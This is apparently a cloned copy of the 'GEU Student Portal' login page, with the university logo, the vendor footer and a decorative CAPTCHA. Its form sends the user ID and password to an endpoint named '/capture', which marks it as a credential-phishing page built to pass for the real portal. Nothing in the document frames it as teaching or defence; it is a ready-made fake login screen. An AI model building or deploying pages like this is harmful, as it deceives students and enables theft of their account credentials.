<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GEU Student Portal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            height: 100vh;
            background-image: url('geuHome.jpg'); 
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }

        .login-form {
            background-color: #ffffff5a; 
            max-width: 350px;
            padding: 20px;
            border-radius: 0px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0); 
            position: absolute;
            top: 9%;
            right: 90px; 
        }

        .logo img {
            display: block;
            margin: 0 auto 20px;
            max-width: 100%;
            height: 65px;
            width: 245px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group input {
            font-size: small;
            width: 93%; 
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 0px; 
            box-sizing: border-box; 
        }

        #captchaContainer {
            text-align: center;
            margin: 20px 0;
            position: relative;
        }

        #captchaCode {
            font-size: 24px;
            letter-spacing: 3px;
            margin-bottom: 15px;
            display: inline-block;
        }

        .bubble {
            position: absolute;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background-color: rgba(255, 255, 255, 0.5);
            mix-blend-mode: multiply;
        }

        .bubble1 {
            top: -8px;
            left: 85px;
            width: 30px;
            height: 30px;
            background-color: #ff5733;
        }

        .bubble2 {
            bottom: 6px;
            right: 88px;
            width: 30px; 
            height: 30px;
            background-color: #5ad664;
        }

        .bubble3 {
            top: -10px;
            right: 104px;
            width: 30px; 
            height: 30px;
            background-color: #6f6ad9;
        }

        button {
            width: 93%;
            padding: 10px;
            background-color: #42a7d3;
            color: white;
            border: none;
            border-radius: 0px; 
            cursor: pointer;
        }

        button:hover {
            background-color: #31a1d1;
        }

        .links {
            display: flex;
            flex-direction: column;
            align-items: flex-end; 
            margin-top: 10px;
        }

        .links a {
            color: #e1e5e9;
            text-decoration: none;
            font-size: 10px;
            margin-top: 5px; 
        }

        .link-separator {
            border-top: 1px solid #ccc;
            margin: 20px 0;
        }

        footer p {
            text-align: center;
            color: #777;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="login-form">
        <div class="logo">
            <img id="geulogo" src="geu-logo.png" alt="GEU Logo">
        </div>
        <form id="loginForm" action="/capture" method="POST">
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder="User ID" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <div class="white-box">
                <div id="captchaBox">
                    <div id="captchaContainer">
                        <div id="captchaCode"></div>
                        <div class="bubble bubble1"></div>
                        <div class="bubble bubble2"></div>
                        <div class="bubble bubble3"></div>
                    </div>
                </div>
            </div>
            <div class="input-group">
                <input type="text" id="captcha" placeholder="Enter CAPTCHA" required>
            </div>
            <div class="g-recaptcha" data-sitekey="YOUR_RECAPTCHA_SITE_KEY"></div> 
            <button type="submit">Login</button>
            <div class="links">
                <a href="#">Forgot password?</a>
                <a href="#">Forgot ID?</a>
            </div>
            <div class="link-separator"></div>
            <footer>
                <p>Powered by Cyborg IT Services (P) Ltd.</p>
            </footer>
        </form>
    </div>
</body>
<script src="script.js"></script>
</html>
